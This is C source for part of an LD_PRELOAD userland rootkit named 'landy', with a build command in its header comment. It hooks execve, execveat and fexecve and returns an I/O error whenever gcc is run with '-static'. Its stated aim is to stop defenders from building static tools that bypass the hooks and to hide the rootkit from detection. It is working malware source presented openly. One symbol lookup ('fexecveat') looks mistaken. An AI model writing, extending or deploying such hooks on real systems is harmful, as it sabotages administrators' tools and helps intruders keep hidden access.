#define _GNU_SOURCE
/*
*@@@ landy @@@
*Hooks execve and breaks static compiling. So far has basic features
*that will hide from detection methods.
*Also tries to hook some other system calls that may be used in place of execve
*
*gcc -std=gnu99 [filename].c -O0 -Wall -fomit-frame-pointer -fPIC -shared -ldl -Wl,--build-id=none -o
*[filename].so
*
*/

#include "h00kDir.h"

//grabs the env variables at linking time(?)
extern char **environ;

//sets the old functions for use later
int (*old_execve)(const char *filename, char *const argv[], char *const envp[]);
int (*old_fexecveat)(int dirfd, const char *pathname, char *const argv[], char *const envp[], int flags);
int (*old_fexecve)(int fd, char *const argv[], char *const envp_three[]);

int breakstatic(char *const argv[]){
    //breaks static compiling
    if(strstr(argv[0], "gcc")){
	for(int i = 1; argv[i] != NULL; i++){
	    if(!strcmp(argv[i],"-static")){
		return 1;
	
	    }
	}
    }
	
    return 0;
	
}

int execve(const char *filename, char *const argv[], char *const envp[]){

//	char deflt[] = "LD_PRELOAD=";

	if(!old_execve){
		old_execve = dlsym(RTLD_NEXT,"execve");		
	}
	
	//is the static flag in the args
	if(breakstatic(argv)){
	    errno = EIO;
	    return -1;
	}


	return old_execve(filename, argv, envp);
}

int execveat(int dirfd, const char *pathname, char *const argv[], char *const envp[], int flags){
    if(!old_fexecveat){
	old_fexecveat = dlsym(RTLD_NEXT,"fexecveat");
    }
    //is the static flag in the args
    if(breakstatic(argv)){
        errno = EIO;
	return -1;
    }

    return old_fexecveat(dirfd, pathname, argv, envp, flags);

}

int fexecve(int fd, char *const argv[], char *const envp[]){
    if(!old_fexecve){
	old_fexecve = dlsym(RTLD_NEXT,"fexecve");
    }
    //is the static flag in the args
    if(breakstatic(argv)){
	errno = EIO;
        return -1;
    }

    return old_fexecve(fd, argv, envp);

}
